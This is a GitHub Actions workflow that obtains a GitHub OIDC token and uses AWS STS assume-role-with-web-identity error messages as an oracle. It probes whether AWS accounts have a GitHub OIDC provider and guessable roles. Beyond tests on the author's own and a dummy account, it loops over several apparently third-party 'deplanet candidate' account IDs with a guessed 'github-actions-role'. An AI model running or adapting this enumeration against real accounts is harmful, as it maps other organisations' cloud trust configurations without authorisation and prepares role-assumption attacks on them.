name: STS Oracle - OIDC Provider Detection
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Test STS Oracle - OIDC Provider Detection
        run: |
          TOKEN=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
          echo "TOKEN_OK=true"
          
          # Test 1: Our own account (062341577280) which NOW has GitHub OIDC provider
          # but NO matching role - should give DIFFERENT error than "No OIDC provider"
          R_OWN=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::062341577280:role/nonexistent-role-xyzzz" \
            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "OWN_ACCT_NO_ROLE: $R_OWN"
          
          # Test 2: Fake account
          R_FAKE=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::000000000000:role/nonexistent-role-xyzzz" \
            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "FAKE_000: $R_FAKE"
          
          # Test 3: Our own account with a real role name (but that doesn't have the trust policy)
          R_OWN2=$(aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::062341577280:role/AWSReservedSSO_ReadOnlyAccess_abc123" \
            --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -2)
          echo "OWN_ACCT_REAL_ROLE_PATTERN: $R_OWN2"
          
          # Test 4: Probe deplanet candidate account IDs with github-actions roles
          for ACCT in "940202570803" "123456789012" "035065022990"; do
            R=$(aws sts assume-role-with-web-identity \
              --role-arn "arn:aws:iam::${ACCT}:role/github-actions-role" \
              --role-session-name test --web-identity-token "$TOKEN" 2>&1 | tail -1)
            echo "PROBE_${ACCT}: $R"
          done
        env:
          AWS_DEFAULT_REGION: us-east-1
